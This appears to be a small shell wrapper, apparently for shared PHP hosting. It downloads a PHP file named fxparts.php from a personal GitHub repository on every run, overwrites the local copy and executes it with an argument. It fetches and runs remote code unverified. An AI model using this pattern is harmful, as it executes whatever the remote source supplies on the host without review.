#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o fxparts.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/fxparts.php?t=$(date +%s)" && mv fxparts.php.new fxparts.php
/opt/alt/php83/usr/bin/php fxparts.php "$1"
